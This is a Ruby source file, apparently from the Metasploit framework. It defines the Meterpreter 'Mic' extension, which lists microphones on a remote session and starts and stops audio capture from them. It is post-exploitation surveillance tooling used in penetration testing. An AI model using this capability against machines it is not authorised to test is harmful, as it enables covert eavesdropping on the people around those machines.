# -*- coding: binary -*-

require 'rex/post/meterpreter/channel'
require 'rex/post/meterpreter/channels/pools/audio_stream_pool'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Stdapi
          module Mic

            ###
            #
            # This meterpreter extension can list and capture from microphone
            #
            ###
            class Mic
              include Msf::Post::Common

              def initialize(client)
                @client = client
              end

              def session
                @client
              end

              # List available microphones
              def mic_list
                response = client.send_request(Packet.create_request('audio_mic_list'))
                names = []
                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_NAME).each do |tlv|
                  names << tlv.value
                end
                names
              end

              # Starts recording audio from microphone
              def mic_start(device_id)
                request = Packet.create_request('audio_mic_start')
                request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_ID, device_id)
                response = client.send_request(request)

                channel = Channel.create(client, 'audio_mic', Rex::Post::Meterpreter::Channels::Pools::AudioStreamPool, CHANNEL_FLAG_SYNCHRONOUS)
              end

              # Stop recording from microphone
              def mic_stop
                client.send_request(Packet.create_request('audio_mic_stop'))
                true
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
